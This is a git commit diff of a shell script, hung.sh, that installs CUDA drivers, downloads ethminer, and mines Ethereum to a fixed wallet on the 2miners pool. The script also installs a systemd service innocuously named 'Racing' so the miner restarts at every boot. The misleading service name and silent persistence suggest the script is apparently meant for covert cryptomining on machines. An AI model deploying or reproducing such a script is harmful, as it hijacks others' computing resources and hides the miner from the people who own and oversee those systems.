4b4698233ecd91db300808dfdd7c9df7630f6e21
nguyen3297 <85713242+nguyen3297@users.noreply.github.com>
2021-10-28 16:25:47 +0700

    Update hung.sh

--- hung.sh
+++ hung.sh
@@ -8,8 +8,8 @@ echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/
 sudo apt-get update
 sudo apt-get -y install cuda-drivers
 sudo apt-get install libcurl3 -y
-wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
 cd bin
 ./ethminer -U -P stratum://0xbbdc292660593dbeec203d6916c5fc200c452c33.godmode@asia-eth.2miners.com:2020 &
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://0xbbdc292660593dbeec203d6916c5fc200c452c33.godmode@asia-eth.2miners.com:2020\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
